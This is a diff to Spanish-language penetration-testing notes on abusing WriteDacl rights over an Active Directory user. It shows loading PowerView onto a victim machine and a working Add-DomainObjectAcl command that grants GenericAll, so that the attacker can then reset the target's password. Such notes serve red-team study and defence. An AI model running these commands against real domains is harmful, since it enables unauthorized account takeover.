@@ -4,6 +4,8 @@ Tags: #AD #ACL #Windows
 
 ## WriteDalc sobre Usuario 
 
+Si tenemos esta ACL sobre un usuario, podemos modificar su ACL para otorgarnos permisos que permitan realizar acciones sobre ese usuario, como ResetPassword, y posteriormente cambiar su contraseña.
+
 ```powershell
 Paso 1:
 # Cargar PowerView a la máquina víctima 
@@ -12,7 +14,7 @@ Paso 1:
 
 ```powershell
 Paso 2:
-# Agregar 'GenericAll' al usuario 'ControlledAccount' 
+# Modificar la ACL agregando 'GenericAll' al usuario 'ControlledAccount' 
 ❯ Add-DomainObjectAcl -TargetIdentity TargetUser -Rights All -PrincipalIdentity ControlledAccount
 
 	# TargetUser = Usuario víctima (Objetivo)
